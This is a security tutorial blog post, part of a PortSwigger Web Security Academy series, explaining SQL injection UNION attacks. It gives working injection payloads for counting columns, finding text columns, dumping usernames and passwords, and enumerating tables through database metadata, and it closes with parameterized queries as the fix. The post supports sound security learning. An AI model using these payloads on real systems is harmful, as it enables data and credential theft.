Title: SQL Injection UNION Attacks: Turning a Product Listing Into a User Dump
Date: 2023-05-21 17:00
Category: Security
Tags: security, sql injection, sqli, union, portswigger, burp suite

Part 3 of our
[PortSwigger Web Security Academy series](working-through-the-portswigger-web-security-academy.html).
[Part 2](sql-injection-fundamentals-four-attack-shapes.html) sketched the
four SQL injection shapes at a bird's-eye view. This post drills into one
of them: the UNION attack. It is one of the most useful shapes to
understand because it converts a small SQLi foothold into an "I can read
anything in the database" primitive.

Wiki reference:
[SQL Injection/UNION Attack](https://charlesreid1.com/wiki/SQL_Injection/UNION_Attack).

## The Idea

Say a page runs

```
SELECT name, description FROM products WHERE category = 'Gifts'
```

The columns you can see in the response are `name` and `description`,
because that is what the query is selecting. UNION lets you attach a
second `SELECT` to the query whose results get returned alongside the
first. If we inject

```
' UNION SELECT username, password FROM users--
```

the query becomes

```
SELECT name, description FROM products WHERE category = ''
UNION SELECT username, password FROM users--'
```

and the page renders product names, product descriptions, usernames,
and passwords, all in the same result set.

Simple enough in principle. The devil is in getting the UNION to actually
be valid SQL.

## Two Requirements for a Valid UNION

SQL is picky about UNIONs. The two SELECTs on either side of the UNION
have to agree on:

1. **The number of columns.** If the first query returns 2 columns, your
   injected SELECT also has to return exactly 2 columns.
2. **The data types of the columns.** In practice, this means "the column
   you want to display text from has to line up with a column position
   that the outer query returned as text-compatible."

Most of the work of pulling off a UNION attack is figuring these two
things out from the outside.

## Finding the Column Count

Two techniques.

**Technique 1: `ORDER BY` bumping.** Send

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

and so on. `ORDER BY N` tells the database to sort by column N. If N
exceeds the actual column count, you get a SQL error. So you increment
until the error appears - the last value that *didn't* error is the
column count.

**Technique 2: `UNION SELECT NULL` bumping.** Send

```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

and so on. NULLs are type-compatible with anything, so the only thing
that will make the UNION fail is a column count mismatch. When the query
stops erroring, you have found the column count.

`ORDER BY` is usually faster because you can binary-search it.
`UNION SELECT NULL` is the fallback when the target database is picky
about `ORDER BY` in weird ways.

## Finding a Text-Compatible Column

Once you know the column count, you need a column whose position will
render as text in the response. If the outer query returns 3 columns and
only one of them shows up in the rendered page, you want to know which
one.

Send

```
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

Whichever variant makes the letter `a` show up on the rendered page is
your target column position. If the database complains about `'a'` being
the wrong type for that position, that column is not text-compatible and
you have to move on to the next one.

## Putting It Together

Now you have a column count and a text-compatible position. Say the count
is 3 and position 2 is text-compatible. Then

```
' UNION SELECT NULL, username, NULL FROM users--
```

dumps every username, and

```
' UNION SELECT NULL, password, NULL FROM users--
```

dumps every password.

You can also concatenate multiple values into a single column, which is
useful when only one column position is text-compatible. Depending on the
database:

* Oracle: `||` concatenation - `' UNION SELECT NULL, username || '~' || password, NULL FROM users--`
* MySQL: `CONCAT()` or space-separated string literals
* Microsoft SQL Server: `+` concatenation

## Finding Interesting Tables

At this point you probably want to know which tables exist and what
columns they have. Every major database exposes this through metadata
tables. On most (Postgres, MySQL, Microsoft SQL Server):

```
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--
```

Oracle uses `all_tables` and `all_tab_columns` instead of
`information_schema`, because Oracle is Oracle.

## The Fix

Same fix as every SQL injection: parameterized queries. The parameters
never become part of the query syntax, so no `UNION`, no `--`, no `OR
1=1` is going to change the shape of the query. It becomes data, not
code.

## References

* Our wiki: [SQL Injection/UNION Attack](https://charlesreid1.com/wiki/SQL_Injection/UNION_Attack)
* [PortSwigger UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
* Labs 3-6 in the PortSwigger SQL Injection Academy
